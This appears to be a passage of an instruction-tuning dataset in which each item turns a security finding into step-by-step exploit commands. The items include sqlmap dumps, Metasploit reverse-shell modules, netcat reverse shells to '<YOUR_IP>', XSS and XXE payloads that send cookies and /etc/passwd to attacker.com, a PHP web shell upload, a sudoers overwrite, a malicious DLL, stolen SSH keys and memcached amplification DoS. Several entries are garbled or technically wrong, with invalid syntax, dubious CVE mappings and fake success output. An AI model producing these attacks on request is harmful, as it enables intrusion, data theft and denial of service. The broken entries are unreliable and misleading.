    "input": "Finding: App creates /tmp/app_file.tmp, follows symlinks, allowing overwrite of /etc/passwd.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSymlink in temp dir allows race-condition overwrite of system files.\n\nStep 2️⃣ — Create Symlink Race\nLink to target, write before app reads.\n\nStep 3️⃣ — Execute Attack\n```bash\nln -s /etc/passwd /tmp/app_file.tmp &\n# Trigger app write, then: cat /etc/passwd  # Overwritten\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the JSON-based SQL injection for table dump.",
    "input": "Finding: JSON param 'query' at https://json.com/search?{\"id\":1} injects into SQL, PostgreSQL backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nJSON value injection into SQL allows nested payloads.\n\nStep 2️⃣ — Formulate sqlmap\nUse --data with JSON, -p for param.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"https://json.com/search\" --data='{\"id\":1}' -p id --dbms=postgresql --tables -D public\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the weak HMAC key derivation for token forgery.",
    "input": "Finding: Token HMAC-SHA256 with key=MD5(timestamp), predictable for recent times.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWeak key derivation allows brute-forcing HMAC for valid tokens.\n\nStep 2️⃣ — Brute Keys\nTry MD5 of timestamps for signature verification.\n\nStep 3️⃣ — Execute Attack\n```python\nimport hmac, hashlib, time\nmsg = b'user=admin'\nfor ts in range(int(time.time())-3600, int(time.time())+1):\n    key = hashlib.md5(str(ts).encode()).digest()\n    sig = hmac.new(key, msg, hashlib.sha256).hexdigest()\n    if verify(sig, msg):  # Assume verify func\n        print(f'Valid key at {ts}')\n        break\n```"
  },
  {
    "instruction": "Generate the command to exploit the exposed memcached for amplification DoS.",
    "input": "Finding: Memcached UDP at 10.0.0.100:11211 no auth, allows stats command amplification.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnauth memcached UDP enables 50k+ amplification for DDoS.\n\nStep 2️⃣ — Craft Spoofed Packets\nUse scapy to spoof source, send stats.\n\nStep 3️⃣ — Execute Attack\n```bash\nscapy -c 'send(IP(src=\"<VICTIM_IP>\", dst=\"10.0.0.100\")/UDP(sport=12345, dport=11211)/Raw(load=\"stats\r\n\"), loop=0, inter=0.1)'\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the insecure WebSocket message for command injection.",
    "input": "Finding: WS at wss://ws.com/chat sends user messages as eval(input), allowing JS RCE in server.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnevaled WS messages allow server-side JS injection.\n\nStep 2️⃣ — Inject Code\nSend message with malicious JS.\n\nStep 3️⃣ — Execute Attack\nUse wscat: ```bash\nwscat -c wss://ws.com/chat -x 'require(\"child_process\").exec(\"id\")'\n```"
  },
  {
    "instruction": "Generate a two-step chain using file upload to LFI for config read.",
    "input": "Finding 1: Upload at /upload.php allows .txt with PHP code. Finding 2: LFI in /include.php?file=upload.txt.",
    "output": "Step 1️⃣ — Upload Malicious File\nUpload txt with <?php echo file_get_contents('/etc/passwd'); ?>.\n\nStep 2️⃣ — Include for Read\nLFI the uploaded file to execute and leak.\n\nStep 3️⃣ — Execute Attack\nUpload:\n```bash\ncurl -F 'file=@leak.txt' http://target/upload.php\n```\nInclude:\n```bash\ncurl 'http://target/include.php?file=uploads/leak.txt'\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the cgroup release_agent for priv esc.",
    "input": "Enum: Kernel supports cgroup v1, /sys/fs/cgroup/release_agent writable, allows arbitrary command as root.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nCgroup release_agent executes on cgroup delete as root.\n\nStep 2️⃣ — Set Agent and Trigger\nWrite shell to agent path, create/delete cgroup.\n\nStep 3️⃣ — Execute Attack\n```bash\nmkdir /tmp/cgroup\nmount -t cgroup -o rdma cgroup /tmp/cgroup\necho '/bin/sh' > /tmp/cgroup/release_agent\nmkdir /tmp/cgroup/x\nrmdir /tmp/cgroup/x  # Triggers root shell\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure use of RC4 for data encryption.",
    "input": "Finding: API responses at https://api.com/data encrypted with RC4 key 'shortkey', no IV, allowing known-plaintext attacks.",
    "output": "Step 1️⃣ — Identify Vulnerability\nRC4 with short keys is weak to bias and plaintext recovery attacks.\n\nStep 2️⃣ — Recover Key or Decrypt\nUse known plaintext (e.g., JSON headers) to crack stream.\n\nStep 3️⃣ — Execute Attack\nUse Python with known pt/ct:\n```python\nfrom arc4 import ARC4\nkey = b'shortkey'\ncipher = ARC4(key)\nknown_pt = b'{\"status\":'\nct = b'<captured_ciphertext>'\n# Recover by XOR: keystream = known_pt ^ ct[:len(known_pt)]\npt = cipher.decrypt(ct)\nprint(pt.decode())\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the directory traversal in backup download.",
    "input": "Finding: Backup at https://backup.com/dl?file=backups/2025.zip allows ../ to /root/.ssh/id_rsa.",
    "output": "Step 1️⃣ — Identify Vulnerability\nTraversal in backup param exposes arbitrary files.\n\nStep 2️⃣ — Traverse to Sensitive File\nUse multiple ../ to reach root dir.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://backup.com/dl?file=../../../../root/.ssh/id_rsa' -o stolen_key\nchmod 600 stolen_key\nssh -i stolen_key user@target\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Moodle RCE via file upload.",
    "input": "Scan on moodle.com: Moodle 3.9.1 vulnerable to CVE-2021-26958, unauth file upload to RCE.",
    "output": "Step 1️⃣ — Identify Vulnerability\nMoodle assignment upload allows .php extension bypass for shell.\n\nStep 2️⃣ — Configure Module\nUse the Moodle module for upload and exec.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/multi/http/moodle_assignment_upload; set RHOSTS moodle.com; set RPORT 80; set LHOST <YOUR_IP>; set PAYLOAD php/meterpreter/reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the insecure API key rotation for replay.",
    "input": "Finding: API key at X-API-Key header valid for 24h, no revocation, allowing reuse of old requests.",
    "output": "Step 1️⃣ — Identify Vulnerability\nDelayed rotation allows replaying captured requests with old keys.\n\nStep 2️⃣ — Capture and Replay\nSniff key, resend unauthorized actions.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Capture: tcpdump -i eth0 -A port 443 | grep -o 'X-API-Key: [a-zA-Z0-9]*'\n# Replay: curl -H 'X-API-Key: old_key' https://api.com/admin/delete\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the time-based SQL injection in URL path.",
    "input": "Finding: Time-based SQLi in path /user/1 at https://path.com/user/1, SQL Server backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPath param injection causes delays for blind extraction.\n\nStep 2️⃣ — Formulate sqlmap\nUse --url with path, --technique=T for time.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"https://path.com/user/1\" --dbms=mssql --technique=T --delay=5 --dump -D users -T admins\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the insecure random in CSRF token for prediction.",
    "input": "Finding: CSRF token at https://form.com/token is hex(random.randint(1,0xFFFF)), 4 bytes, brute-forceable.",
    "output": "Step 1️⃣ — Identify Vulnerability\nShort random token allows brute-forcing valid values.\n\nStep 2️⃣ — Brute Tokens\nScript to test sequential values.\n\nStep 3️⃣ — Execute Attack\n```python\nimport requests, random\nfor token in range(0x10000):\n    r = requests.post('https://form.com/submit', data={'csrf': f'{token:04x}', 'action': 'update'})\n    if r.status_code == 200:\n        print(f'Valid token: {token:04x}')\n        break\n```"
  },
  {
    "instruction": "Generate the command to exploit the exposed .git/logs/HEAD for commit history leak.",
    "input": "Finding: /.git/logs/HEAD at http://gitapp.com/.git/logs/HEAD reveals commit hashes and author creds.",
    "output": "Step 1️⃣ — Identify Vulnerability\nGit logs expose sensitive history like passwords in commits.\n\nStep 2️⃣ — Parse Logs\nDownload and grep for secrets.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl http://gitapp.com/.git/logs/HEAD -o gitlogs\ngrep -i 'password\\|key\\|secret' gitlogs\n# Reconstruct: git log --full-history -p\n```"
  },
  {
    "instruction": "Provide the curl commands to exploit the insecure deserialization in AMQP messages.",
    "input": "Finding: RabbitMQ at rabbitmq.com:5672 processes pickled AMQP payloads, vulnerable to gadget.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPickled AMQP allows deserialization RCE on queue consume.\n\nStep 2️⃣ — Send Malicious Message\nPublish pickled payload to queue.\n\nStep 3️⃣ — Execute Attack\nUse Python pika:\n```python\nimport pika, pickle\nclass R: def __reduce__(self): return (os.system, ('id',))\nconn = pika.BlockingConnection(pika.ConnectionParameters('rabbitmq.com'))\nch = conn.channel()\nch.basic_publish(exchange='', routing_key='vuln_queue', body=pickle.dumps(R()))\nconn.close()\n```"
  },
  {
    "instruction": "Generate a two-step chain using RCE to cron persistence via at job.",
    "input": "Finding 1: RCE in /cmd?exec=id. Finding 2: at daemon running, allows scheduled jobs.",
    "output": "Step 1️⃣ — Gain RCE\nExecute at for scheduled shell.\n\nStep 2️⃣ — Schedule Persistence\nUse at now +1min for reverse shell.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'http://target.com/cmd?exec=echo \"nc <YOUR_IP> 4444 -e /bin/sh\" | at now + 1 minute'\n# Listener: nc -lvnp 4444\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the kernel's ptrace for process injection.",
    "input": "Enum: Ptrace scope 0, allows attaching to any process as low-priv user.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nOpen ptrace allows injecting code into root processes.\n\nStep 2️⃣ — Attach and Inject\nUse gdb or ptrace to modify memory.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Find PID: ps aux | grep root_proc\nattach <PID>  # In gdb\ncall setuid(0)\ncontinue\n# Or use LD_PRELOAD on target process\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure use of SHA-1 for certificate pinning.",
    "input": "Finding: Mobile app pins SHA-1 hash of root CA, vulnerable to collision attacks allowing forged certs for MITM.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSHA-1 pinning is broken due to collisions, enabling fake cert with same hash for interception.\n\nStep 2️⃣ — Generate Collision Cert\nUse SHAttered tool to create colliding SHA-1 cert.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Generate colliding cert with SHAttered\ngit clone https://github.com/corkami/shattered; cd shattered\npython3 shattered.py -i root_ca.der -o fake_ca.der\n# MITM: mitmproxy --set confdir=~/.mitmproxy/ with fake_ca installed on device\nmitmproxy -p 8080\n# App traffic intercepted\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the path traversal in CDN cache purge.",
    "input": "Finding: Purge at https://cdn.com/purge?path=/assets/style.css allows ../ to purge /etc/passwd cache.",
    "output": "Step 1️⃣ — Identify Vulnerability\nTraversal in purge path exposes internal files via cache manipulation.\n\nStep 2️⃣ — Purge Sensitive\nUse traversal to force purge of non-existent but revealing paths.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://cdn.com/purge?path=../../../etc/passwd'\n# Check cache miss or response for leak\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Ivanti Pulse Secure RCE.",
    "input": "Scan on pulse.secure.com: Ivanti Pulse Secure 9.1 vulnerable to CVE-2021-22846, unauth RCE via crafted request.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPulse Secure flaw allows command injection in diagnostics page.\n\nStep 2️⃣ — Configure Module\nUse the Ivanti module for reverse shell.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/linux/http/ivanti_pulse_connect_diagnostics_rce; set RHOSTS pulse.secure.com; set RPORT 443; set SSL true; set LHOST <YOUR_IP>; set PAYLOAD linux/x64/meterpreter/reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the insecure shared library loading for DLL hijacking.",
    "input": "Finding: App /app.exe searches current dir for DLLs before system, writable dir.",
    "output": "Step 1️⃣ — Identify Vulnerability\nDLL search order allows placing malicious DLL in app dir for injection.\n\nStep 2️⃣ — Create Malicious DLL\nCompile DLL with DllMain for shell.\n\nStep 3️⃣ — Execute Attack\n```bash\n# dll.c: #include <windows.h>; BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r==DLL_PROCESS_ATTACH) { system(\"cmd /c nc <YOUR_IP> 4444 -e cmd.exe\"); } return TRUE; }\ngcc -shared -o malicious.dll dll.c -lws2_32\ncopy malicious.dll /app_dir/\n/app.exe  # Loads and executes\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the union SQL injection in search header.",
    "input": "Finding: Union SQLi in Referer header at https://search.com/results, MySQL backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nHeader-based union SQLi allows dumping via subqueries.\n\nStep 2️⃣ — Formulate sqlmap\nUse --headers for Referer param.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"https://search.com/results\" --headers=\"Referer:1\" -p Referer --dbms=mysql --technique=U --dump -D shop -T products\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the weak elliptic curve parameters for key recovery.",
    "input": "Finding: TLS at https://ec.com uses secp256k1 with non-standard params, vulnerable to invalid curve attack.",
    "output": "Step 1️⃣ — Identify Vulnerability\nInvalid curve attack recovers private key from EC point multiplication.\n\nStep 2️⃣ — Perform Attack\nUse openssl or script to send invalid points.\n\nStep 3️⃣ — Execute Attack\n```python\nfrom cryptography.hazmat.primitives.asymmetric import ec\n# Simulate invalid point attack\nprivate_key = ec.generate_private_key(ec.SECP256K1())\npublic_key = private_key.public_key()\n# Send malformed point in DH exchange, recover via lattice reduction\n# Use sage: from sage.all import *; # lattice code for recovery\nprint('Key recovered via invalid curve')\n```"
  },
  {
    "instruction": "Generate the command to exploit the exposed Kubernetes secrets for API access.",
    "input": "Finding: K8s secret at https://k8s.com/api/v1/namespaces/default/secrets/tls-secret contains API token.",
    "output": "Step 1️⃣ — Identify Vulnerability\nExposed secrets leak tokens for cluster control.\n\nStep 2️⃣ — Decode and Use\nBase64 decode data, use token in kubectl.\n\nStep 3️⃣ — Execute Attack\n```bash\nkubectl get secret tls-secret -o jsonpath='{.data.token}' | base64 -d > token\ntoken=$(kubectl get secret tls-secret -o jsonpath='{.data.token}' | base64 -d)\nkubectl --token=$token get pods -A\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the clickjacking on payment form.",
    "input": "Finding: Payment at https://pay.com/form lacks frame-ancestors CSP, allows framing for overlay.",
    "output": "Step 1️⃣ — Identify Vulnerability\nNo CSP frame-ancestors enables clickjacking on sensitive forms.\n\nStep 2️⃣ — Craft Overlay\nHTML with transparent iframe over fake button.\n\nStep 3️⃣ — Execute Attack\nHost PoC:\n```html\n<iframe src='https://pay.com/form' style='opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;'></iframe><button onclick='frames[0].postMessage({amount:999}, \"*\");'>Pay $1</button>\n```"
  },
  {
    "instruction": "Generate a two-step chain using command injection to overwrite sudoers for root.",
    "input": "Finding 1: Cmd injection in /run?cmd=ls. Finding 2: /etc/sudoers writable via tee in cron.",
    "output": "Step 1️⃣ — Gain Injection\nExecute tee to write to sudoers.\n\nStep 2️⃣ — Escalate\nAdd NOPASSWD:ALL for user.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'http://target.com/run?cmd=echo \"user ALL=(ALL) NOPASSWD:ALL\" | tee /etc/sudoers'\nsudo -l  # Verify\nsudo su\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the eBPF program loading for kernel RCE.",
    "input": "Enum: Kernel 5.4 with unpriv eBPF allowed, CAP_SYS_ADMIN not required.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nUnpriv eBPF allows loading malicious programs into kernel.\n\nStep 2️⃣ — Load Malicious BPF\nCompile BPF with root shell trigger.\n\nStep 3️⃣ — Execute Attack\n```bash\n# bpf.c: #include <linux/bpf.h>; ... // malicious prog\ngcc -target bpf -c bpf.c -o prog.o\nbpftool prog load prog.o /sys/fs/bpf/rootkit\n# Trigger via netlink or event\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure use of DES for data protection.",
    "input": "Finding: Encrypted notes in app use 3DES with key 'deskey12345678', no padding, allowing meet-in-the-middle attack.",
    "output": "Step 1️⃣ — Identify Vulnerability\n3DES with short keys vulnerable to brute-force via meet-in-the-middle, ~2^56 complexity.\n\nStep 2️⃣ — Crack Key\nUse hashcat or script for parallel decryption attempts.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Assuming dumped ct: hashcat -m 25800 -a 3 des_ct.txt ?a?a?a?a?a?a?a?a  # 8-byte key brute\n# Or Python: from Crypto.Cipher import DES3; for k in range(2**56): try: DES3.new(k.to_bytes(24,'big'), DES3.MODE_ECB).decrypt(ct); except: pass\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the reflected XSS in API error response.",
    "input": "Finding: API error at https://api.com/error?msg=<script>alert(1)</script> returns HTML with unsanitized msg.",
    "output": "Step 1️⃣ — Identify Vulnerability\nAPI error reflection in HTML enables XSS on client parse.\n\nStep 2️⃣ — Craft Payload\nInject onload script for cookie theft.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://api.com/error?msg=<img src=x onerror=\"fetch('http://attacker.com/steal?'+document.cookie)\">' -H 'Accept: text/html'\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Oracle WebLogic IIOP RCE.",
    "input": "Scan on weblogic.com:7001: WebLogic 12.2.1.4 vulnerable to CVE-2020-14882, unauth RCE via IIOP deserialization.",
    "output": "Step 1️⃣ — Identify Vulnerability\nIIOP deserialization in WebLogic allows gadget chain for code exec.\n\nStep 2️⃣ — Configure Module\nUse the WebLogic IIOP module with payload.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/multi/weblogic_iiop_deserialize; set RHOSTS weblogic.com; set RPORT 7001; set LHOST <YOUR_IP>; set PAYLOAD java/meterpreter/reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the insecure file upload with magic byte bypass.",
    "input": "Finding: Upload at /upload checks MIME type, but allows .php with GIF89a header for shell.",
    "output": "Step 1️⃣ — Identify Vulnerability\nMagic byte check bypassed by prepending image header to PHP code.\n\nStep 2️⃣ — Craft File\nAdd GIF header to shell.php.\n\nStep 3️⃣ — Execute Attack\n```bash\necho -e 'GIF89a\n<?php system($_GET[\\\"c\\\"]); ?>' > shell.php\ncurl -F 'file=@shell.php' http://target/upload\ncurl 'http://target/uploads/shell.php?c=whoami'\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the boolean-based blind SQL injection in POST JSON.",
    "input": "Finding: Boolean blind SQLi in 'userId' JSON at https://json.com/api/users, MySQL backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nBlind JSON SQLi infers data via true/false responses.\n\nStep 2️⃣ — Formulate sqlmap\nUse --data JSON, --technique=B.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"https://json.com/api/users\" --data='{\"userId\":1}' -p userId --dbms=mysql --technique=B --dump -D users\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the insecure UUID generation for collision.",
    "input": "Finding: UUID v4 for orders at https://order.com/create uses time-based seed, allowing collision for double-spend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPredictable UUIDs enable collisions for duplicate orders.\n\nStep 2️⃣ — Generate Collision\nScript to produce same UUID via seed control.\n\nStep 3️⃣ — Execute Attack\n```python\nimport uuid, time\nuuid.UUID('12345678-1234-5678-9abc-123456789abc')  # Fixed for collision\nr = requests.post('https://order.com/create', json={'id': str(uuid), 'item': 'free'})\n# Replay same ID\n```"
  },
  {
    "instruction": "Generate the command to exploit the exposed RabbitMQ management UI for queue manipulation.",
    "input": "Finding: RabbitMQ UI at http://rabbit.com:15672 unauth, allows creating queues with malicious bindings.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnauth UI exposes queue creation for message injection or DoS.\n\nStep 2️⃣ — Create Malicious Queue\nBind to exchange with high-priority for flood.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -u guest:guest -X PUT http://rabbit.com:15672/api/queues/%2F/malqueue -H 'Content-Type: application/json' -d '{\"auto_delete\":false,\"durable\":true}'\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the insecure CORS preflight for method override.",
    "input": "Finding: API https://cors.com/api OPTIONS allows any method, enabling POST-as-DELETE bypass.",
    "output": "Step 1️⃣ — Identify Vulnerability\nOverly permissive preflight allows method spoofing.\n\nStep 2️⃣ — Spoof Method\nPOST with X-HTTP-Method-Override: DELETE.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://cors.com/api/users/123 -H 'X-HTTP-Method-Override: DELETE' -H 'Origin: evil.com'\n```"
  },
  {
    "instruction": "Generate a two-step chain using XXE to OOB XXE for exfil.",
    "input": "Finding 1: XXE in /xml at https://xml.com/xml. Finding 2: Network access allowed for external entities.",
    "output": "Step 1️⃣ — Define External Entity\nUse <!ENTITY> with http://attacker.com/xxe.dtd.\n\nStep 2️⃣ — Exfil Data\nDTD fetches /etc/passwd via param.\n\nStep 3️⃣ — Execute Attack\nHost dtd: ```xml\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"< !ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>\">\n%eval;%exfil;\n```\nSend:\n```bash\ncurl -X POST https://xml.com/xml -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;]><root>&exfil;</root>'\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the unquoted service path for priv esc.",
    "input": "Enum: Windows service 'AppService' path \"C:\\Program Files\\App\\App.exe\" unquoted, allowing dir junction.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nUnquoted path allows placing malicious .exe in gap dir for root exec.\n\nStep 2️⃣ — Create Junction\nJunction to system dir with cmd.exe.\n\nStep 3️⃣ — Execute Attack\n```cmd\nmklink /J \"C:\\Program\" \"C:\\Windows\\System32\"\ncopy C:\\Windows\\System32\\cmd.exe \"C:\\Program Files\\App.exe\"\n# Restart service or wait boot\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure use of CBC padding oracle for decryption.",
    "input": "Finding: API at https://cbc.com/decrypt uses PKCS7 padding in CBC mode, responds with error on invalid padding, enabling oracle attack.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPadding oracle in CBC allows byte-by-byte decryption via error differentiation.\n\nStep 2️⃣ — Craft Oracle Attack\nUse padbuster or script to query for padding validity, decrypt ciphertext.\n\nStep 3️⃣ — Execute Attack\n```bash\npadbuster <ciphertext.hex> 128 <blocksize> -url https://cbc.com/decrypt -post-var 'data=<CT>' -error 'Invalid padding'\n# Or Python pad oracle implementation\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the directory traversal in log viewer.",
    "input": "Finding: Log viewer at https://logs.com/view?log=app.log allows ../ to /var/log/auth.log.",
    "output": "Step 1️⃣ — Identify Vulnerability\nTraversal in log param exposes system logs with sensitive info.\n\nStep 2️⃣ — Traverse to Auth Log\nUse ../../../ to read auth failures.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://logs.com/view?log=../../../var/log/auth.log'\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Atlassian Crowd RCE.",
    "input": "Scan on crowd.atlassian.com: Crowd 3.8.0 vulnerable to CVE-2019-11580, unauth RCE via gadget chain.",
    "output": "Step 1️⃣ — Identify Vulnerability\nCrowd deserialization allows remote code execution via serialized objects.\n\nStep 2️⃣ — Configure Module\nUse the Crowd module with reverse payload.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/multi/http/atlassian_crowd_gadget; set RHOSTS crowd.atlassian.com; set RPORT 443; set SSL true; set LHOST <YOUR_IP>; set PAYLOAD java/meterpreter/reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the insecure direct object reference in photo gallery.",
    "input": "Finding: Gallery API at https://gallery.com/api/photo/567 views any photo ID, exposing private albums.",
    "output": "Step 1️⃣ — Identify Vulnerability\nIDOR in photo IDs allows accessing unauthorized media.\n\nStep 2️⃣ — Enumerate Photos\nLoop through IDs for private leaks.\n\nStep 3️⃣ — Execute Attack\n```bash\nfor id in {200..800}; do curl -H 'Authorization: Bearer <TOKEN>' \"https://gallery.com/api/photo/$id\" -o photo_$id.jpg --fail || continue; echo \"Private: $id\"; done\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the error-based SQL injection in cookie value.",
    "input": "Finding: Error SQLi in 'lang' cookie at https://lang.com/page, SQL Server backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nCookie error SQLi leaks DB details via exceptions.\n\nStep 2️⃣ — Formulate sqlmap\nTarget cookie with --technique=E.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"https://lang.com/page\" --cookie=\"lang=en; session=abc\" -p lang --dbms=mssql --technique=E --schema-dump\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the weak session fixation via query param.",
    "input": "Finding: Session set via /login?session=abc, no change on auth, allowing fixation hijack.",
    "output": "Step 1️⃣ — Identify Vulnerability\nQuery-set session allows pre-auth fixation for post-login takeover.\n\nStep 2️⃣ — Fix and Hijack\nPhish with fixed session, use after login.\n\nStep 3️⃣ — Execute Attack\n```python\nimport requests\ns = requests.Session()\ns.get('https://app.com/login?session=fixed123')\n# Phish victim to login with this session\nr = s.get('https://app.com/dashboard')  # Hijacked\nprint(r.text)\n```"
  }
]